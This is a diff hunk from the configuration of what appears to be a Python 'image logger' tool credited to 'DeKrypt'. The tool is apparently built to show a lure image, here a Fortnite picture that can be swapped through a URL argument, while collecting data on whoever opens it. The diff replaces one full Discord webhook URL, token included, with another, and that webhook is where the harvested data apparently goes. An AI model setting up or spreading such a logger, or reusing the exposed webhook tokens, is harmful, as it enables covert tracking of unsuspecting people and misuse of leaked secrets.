@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1231552740753149962/sYhVIT-bSpdYpyYXaPe7OcPRAVy_bXxDyM4sGaVDok0Vh6zYVaRNnwqsQFKhpJnzQWja",
+    "webhook": "https://discord.com/api/webhooks/1231556676918841394/cqcUy1idVBccmmgNiBgp_ulzRKZ0U-BLSkAg-gvRBaG_fAOkVhiHq0CLgXoZNd80isW2",
     "image": "https://dotesports.com/wp-content/uploads/2023/12/fortnite-peter-griffin-trailer.png?resize=300", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
